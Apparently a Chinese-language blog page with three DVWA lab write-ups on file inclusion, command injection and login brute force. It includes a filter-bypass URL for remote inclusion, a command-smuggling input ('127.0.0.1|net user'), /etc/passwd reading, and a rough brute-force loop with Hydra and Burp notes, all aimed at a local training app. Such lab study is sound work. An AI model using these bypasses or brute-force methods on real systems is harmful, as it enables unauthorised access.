                <a href="/2019/06/26/DVWA（三）文件包含/" class="post-title-link" itemprop="url">DVWA（三）文件包含漏洞</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-06-26 12:00:00" itemprop="dateCreated datePublished" datetime="2019-06-26T12:00:00+08:00">2019-06-26</time>
            </span>
          

          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-07-27 17:30:18" itemprop="dateModified" datetime="2019-07-27T17:30:18+08:00">2019-07-27</time>
              </span>
            
          

          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;php</span><br><span class="line"><span class="comment">//Thepagewewishtodisplay</span></span><br><span class="line">$file=$_GET[<span class="string">'page'</span>];</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>从代码上看，page参数后面跟着的任何文件路径都会被服务器解析。</p>
<p>因此，直接看它的文件内容，比如查看 <code>/etc/passwd</code>：</p>
<p><img src="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092307.png" alt="1553780890221"></p>
<blockquote>
<p>为什么有时候文件是下载，有时候文件是直接在页面中显示。换句话将，什么时候文件由服务器进行解析，什么时候文件直接以附件形式直接让客户端下载。</p>
</blockquote>
<p>由 <code>Request</code>过程中的 <code>accept</code>，如果有 <code>multiform</code>的形式，则需要 <code>Content-Disposition</code>进行指定。实际上，哪些内容由服务器解析，并不是以文件后缀名限定的。具体的需要看 RFC的相关内容。</p>
<h3 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;php</span><br><span class="line"></span><br><span class="line"><span class="comment">//Thepagewewishtodisplay</span></span><br><span class="line">$file=$_GET[<span class="string">'page'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//Inputvalidation</span></span><br><span class="line">$file=str_replace(<span class="keyword">array</span>(<span class="string">"http://"</span>,<span class="string">"https://"</span>),<span class="string">""</span>,$file);</span><br><span class="line">$file=str_replace(<span class="keyword">array</span>(<span class="string">"../"</span>,<span class="string">"..\""</span>),<span class="string">""</span>,$file);</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p><code>str_replace</code>是个危险函数，因为可以采用 <code>双写</code>规则绕过漏洞</p>
<p><code>http://</code> =》<code>hthttp://tp://</code>   </p>
<p><img src="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092311.png" alt="1553781508931"></p>
<p>如图，在低级别验证中，可以采用上图url形式进行远程文件包含.形如</p>
<p><code>http://127.0.0.1/vulnerabilities/fi/?page=http://127.0.0.1/vulnerabilities/fi/?page=include.php</code></p>
<p>中等级别采用双拼：</p>
<p><code>http://127.0.0.1/vulnerabilities/fi/?page=hthttp://tp://127.0.0.1/vulnerabilities/fi/?page=include.php</code></p>
<h3 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;php</span><br><span class="line"></span><br><span class="line"><span class="comment">//Thepagewewishtodisplay</span></span><br><span class="line">$file=$_GET[<span class="string">'page'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//Inputvalidation</span></span><br><span class="line"><span class="keyword">if</span>(!fnmatch(<span class="string">"file*"</span>,$file)&amp;&amp;$file!=<span class="string">"include.php"</span>)&#123;</span><br><span class="line">   <span class="comment">//Thisisn'tthepagewewant!</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">"ERROR:Filenotfound!"</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>将 <code>str_replace</code>替换为 <code>fnmatch</code> ，保证服务器只能够通过 <code>file</code>协议来获取文件。</p>
<blockquote>
<p>这里可以配合权限设置，保证只能获取到当前文件目录下的权限。</p>
</blockquote>
<p>这里就无法使用http协议进行远程文件包含。绕过该漏洞，需要网站存在相关的上传漏洞。</p>
<h2 id="参考-amp-引用"><a href="#参考-amp-引用" class="headerlink" title="参考 &amp; 引用"></a>参考 &amp; 引用</h2><p><a href="https://www.freebuf.com/articles/web/119150.html" target="_blank" rel="noopener">freebuf教程之文件包含</a></p>
<p><a href="https://blog.csdn.net/weixin_36525275/article/details/79887784" target="_blank" rel="noopener">一句话木马原理</a></p>
<p><a href="https://www.t00ls.net/articles-28388.html" target="_blank" rel="noopener">菜刀工作原理分析</a></p>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>

    
        

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/25/DVWA（二）命令注入/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="楚河">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/06/25/DVWA（二）命令注入/" class="post-title-link" itemprop="url">DVWA（二）命令注入</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-06-25 12:00:00" itemprop="dateCreated datePublished" datetime="2019-06-25T12:00:00+08:00">2019-06-25</time>
            </span>
          

          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-07-27 17:29:27" itemprop="dateModified" datetime="2019-07-27T17:29:27+08:00">2019-07-27</time>
              </span>
            
          

          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p> 客户端可以执行用户提交的任意命令</p>
</blockquote>
<h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h3><ul>
<li>不过滤任何特殊字符</li>
</ul>
<h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><ul>
<li>只过滤 &amp;&amp; 和 ;</li>
</ul>
<h3 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$substitutions = <span class="keyword">array</span>( </span><br><span class="line"></span><br><span class="line">        <span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">'|  '</span> =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">'-'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">'$'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">'('</span>  =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">')'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">'`'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">'||'</span> =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">    );</span><br></pre></td></tr></table></figure>

<p>high级别过滤的‘|’后面跟着一个空格，因此 <code>127.0.0.1|net user</code>仍然可以执行。</p>
<h3 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3><p><img src="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092258.png" alt="1553780622504"></p>
<p>可以结果 <code>burpsuite</code>直接进行扫描。</p>
<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p><a href="https://www.freebuf.com/articles/web/116714.html" target="_blank" rel="noopener">freebuf教程之command injection</a></p>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>

    
        

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/24/DVWA（一）密码爆破登录/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="楚河">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/06/24/DVWA（一）密码爆破登录/" class="post-title-link" itemprop="url">DVWA（一）密码爆破登录</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-06-24 12:00:00" itemprop="dateCreated datePublished" datetime="2019-06-24T12:00:00+08:00">2019-06-24</time>
            </span>
          

          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-07-27 17:28:45" itemprop="dateModified" datetime="2019-07-27T17:28:45+08:00">2019-07-27</time>
              </span>
            
          

          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>工具： <code>Burpsuite</code> <code>wireshark</code> <code>Hydra</code></p>
<h3 id="分析首页登录过程"><a href="#分析首页登录过程" class="headerlink" title="分析首页登录过程"></a>分析首页登录过程</h3><p><img src="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092222.png" alt="1553608887062"></p>
<p>首页的登录界面是一个标准的表单提交过程，提交的方法是 <strong>POST</strong>。但是分析网页结构可以发现，它包含一个隐藏的 <code>input</code>元素。</p>
<h4 id="发起点击行为"><a href="#发起点击行为" class="headerlink" title="发起点击行为"></a>发起点击行为</h4><p>随便输入用户密码后，点击提交。主要的交互过程如下：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Request（POST）：</span></span><br><span class="line">    Login	Login</span><br><span class="line">    password	test</span><br><span class="line">    user_token	2c8e253430ec4771e4d1cee142ea87d1</span><br><span class="line">    username	test</span><br><span class="line">    </span><br><span class="line">Response （302 FOUND） ：</span><br><span class="line">	<span class="attribute">Location</span>: login.php</span><br><span class="line">	<span class="attribute">null</span></span><br></pre></td></tr></table></figure>

<p>在每一次提交过程中，我们可以发现。<code>POST</code>的 <code>user_token</code>每次都发生改变。</p>
<p>因此在进行爆破攻击时首先要分析页面获取到user_token的值，然后再进行提交。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 这是使用nodejs写的代码。运行需要一定的依赖包.</span><br><span class="line">words.map (<span class="function"><span class="params">word</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> user_token = $(<span class="string">"input.hidden"</span>).value</span><br><span class="line">    <span class="keyword">let</span> payload = &#123;<span class="attr">admin</span>: word.username, <span class="attr">password</span>: word.password, user.token=user_token&#125;</span><br><span class="line">    <span class="keyword">let</span> response = <span class="keyword">async</span> Request.get(payload)</span><br><span class="line">    <span class="keyword">if</span>(reponse.content.noinclude(<span class="string">'form'</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> word</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    	<span class="keyword">this</span>.ctx = response</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="无user-token暴力突破"><a href="#无user-token暴力突破" class="headerlink" title="无user_token暴力突破"></a>无<code>user_token</code>暴力突破</h3><h4 id="采用burpsuite进行突破"><a href="#采用burpsuite进行突破" class="headerlink" title="采用burpsuite进行突破"></a>采用burpsuite进行突破</h4><p>在配置好代理和SSL证书以后，将登录页面<code>vulnerabilities/brute/</code>加入到 <code>Intruder</code>中。</p>
<p>设置好爆破字典payloads。</p>
<p>直接使用<code>burpsuite</code>进行遍历。（使用较为简单，参考帮助文档即可）</p>
<h4 id="使用hydra进行突破"><a href="#使用hydra进行突破" class="headerlink" title="使用hydra进行突破"></a>使用hydra进行突破</h4><p>hydra的密码测试速度极快。但是需要确保：</p>
<ol>
<li>登录时携带cookie</li>
<li>设置cookie时第一个字母会被忽略</li>
</ol>
<p><img src="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092231.png" alt="1553782149835"></p>
<p>命令如图所思， hydra携带参数默认以冒号进行分割。值得注意的是 <code>Cookie</code>的设置。</p>
<p>在我大量分析包的时候发现，hydra在  <code>opensuse</code>环境下，会将 <code>cookie</code>的第一个字母进行忽略。</p>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>

    
  </section>

  


          </div>
          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">

          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  
  <p class="site-author-name" itemprop="name">John Doe</p>
  <div class="site-description motion-element" itemprop="description"></div>
</div>


  <nav class="site-state motion-element">
    
      <div class="site-state-item site-state-posts">
        
          <a href="/archives/">
        
          <span class="site-state-item-count">6</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
    

    

    
      
      
      <div class="site-state-item site-state-tags">
        
        
        
          
        
          
        
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">tags</span>
        
      </div>
    
  </nav>













          
          
        </div>
      </div>

      

      

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>

  

  
</div>


  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.2.0</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

    

  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>
















  
  









  
  <script src="/lib/jquery/index.js?v=3.4.1"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>




  <script src="/js/utils.js?v=7.2.0"></script>

  <script src="/js/motion.js?v=7.2.0"></script>



  
  


  <script src="/js/schemes/muse.js?v=7.2.0"></script>



  

  <script src="/js/next-boot.js?v=7.2.0"></script>

  

  

  


  























<script>
// GET RESPONSIVE HEIGHT PASSED FROM IFRAME

window.addEventListener("message", function(e) {
  var data = e.data;
  if ((typeof data === 'string') && (data.indexOf('ciu_embed') > -1)) {
    var featureID = data.split(':')[1];
    var height = data.split(':')[2];
    $(`iframe[data-feature=${featureID}]`).height(parseInt(height) + 30);
  }
}, false);
</script>








  

</body>
</html>
